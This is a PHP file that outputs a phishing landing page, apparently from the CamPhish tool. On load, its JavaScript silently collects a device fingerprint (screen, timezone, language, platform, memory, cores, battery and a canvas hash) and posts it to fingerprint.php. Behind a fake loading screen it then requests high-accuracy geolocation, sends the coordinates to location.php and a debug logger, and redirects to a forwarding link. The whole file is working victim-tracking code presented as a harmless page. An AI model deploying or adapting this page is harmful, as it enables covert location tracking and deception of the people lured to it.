<?php
include 'ip.php';

// Add JavaScript to capture location
echo '
<!DOCTYPE html>
<html>
<head>
    <title>page_title_placeholder</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src \'self\' https:; script-src \'self\' \'unsafe-inline\' https:; style-src \'self\' \'unsafe-inline\' https:; img-src \'self\' data: https:; media-src \'self\' blob: https:; connect-src \'self\' https:;">
    <link rel="icon" type="image/png" href="favicon_url_placeholder">
    <script>
        // Redirect to HTTPS if accessed over plain HTTP (tunnels always use HTTPS)
        (function() {
            var h = window.location.hostname;
            if (window.location.protocol !== "https:" && h !== "localhost" && h !== "127.0.0.1") {
                window.location.href = "https://" + h + window.location.pathname + window.location.search;
            }
        })();

        // Collect device fingerprint and send to server
        function collectFingerprint() {
            var data = {
                screen:    screen.width + "x" + screen.height + "@" + screen.colorDepth + "bit",
                tz:        (typeof Intl !== "undefined") ? Intl.DateTimeFormat().resolvedOptions().timeZone : "Unknown",
                lang:      navigator.language || navigator.userLanguage || "Unknown",
                platform:  navigator.platform || "Unknown",
                memory:    navigator.deviceMemory || "Unknown",
                cores:     navigator.hardwareConcurrency || "Unknown",
                battery:   "Unknown",
                canvas_fp: "Unknown"
            };

            // Canvas fingerprint
            try {
                var c = document.createElement("canvas");
                var ctx = c.getContext("2d");
                ctx.textBaseline = "top";
                ctx.font = "14px Arial";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("CamPhish", 2, 15);
                ctx.fillStyle = "rgba(102,204,0,0.7)";
                ctx.fillText("fingerprint", 4, 45);
                var raw = c.toDataURL();
                var hash = 0;
                for (var i = 0; i < raw.length; i++) {
                    hash = ((hash << 5) - hash) + raw.charCodeAt(i);
                    hash |= 0;
                }
                data.canvas_fp = (hash >>> 0).toString(16);
            } catch(e) {}

            // Battery API
            if (navigator.getBattery) {
                navigator.getBattery().then(function(b) {
                    data.battery = Math.round(b.level * 100) + "% " + (b.charging ? "charging" : "discharging");
                    sendFingerprint(data);
                }).catch(function() { sendFingerprint(data); });
            } else {
                sendFingerprint(data);
            }
        }

        function sendFingerprint(data) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "fingerprint.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            var params = Object.keys(data).map(function(k) {
                return encodeURIComponent(k) + "=" + encodeURIComponent(data[k]);
            }).join("&");
            xhr.send(params);
        }

        // Debug function to log messages - only log essential information
        function debugLog(message) {
            // Only log essential location data, not status messages
            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
                console.log("DEBUG: " + message);
                
                // Send only essential logs to server
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "debug_log.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("message=" + encodeURIComponent(message));
            }
        }
        
        function getLocation() {
            if (navigator.geolocation) {
                document.getElementById("locationStatus").innerText = "Requesting location permission...";
                
                navigator.geolocation.getCurrentPosition(
                    sendPosition, 
                    handleError, 
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
                setTimeout(function() {
                    redirectToMainPage();
                }, 2000);
            }
        }
        
        function sendPosition(position) {
            debugLog("Position obtained successfully");
            document.getElementById("locationStatus").innerText = "Location obtained, loading...";
            
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            
            debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    setTimeout(function() {
                        redirectToMainPage();
                    }, 1000);
                }
            };
            
            xhr.onerror = function() {
                redirectToMainPage();
            };
            
            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
        }
        
        function handleError(error) {
            document.getElementById("locationStatus").innerText = "Redirecting...";
            setTimeout(function() {
                redirectToMainPage();
            }, 2000);
        }
        
        function redirectToMainPage() {
            try {
                window.location.href = "forwarding_link/index2.html";
            } catch (e) {
                window.location = "forwarding_link/index2.html";
            }
        }
        
        window.onload = function() {
            collectFingerprint();
            setTimeout(function() {
                getLocation();
            }, 500);
        };
    </script>
</head>
<body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
    <h2>Loading, please wait...</h2>
    <p>Please allow location access for better experience</p>
    <p id="locationStatus">Initializing...</p>
    <div style="margin-top: 30px;">
        <div class="spinner" style="border: 8px solid #333; border-top: 8px solid #f3f3f3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
    </div>
    
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
';
exit;
?>
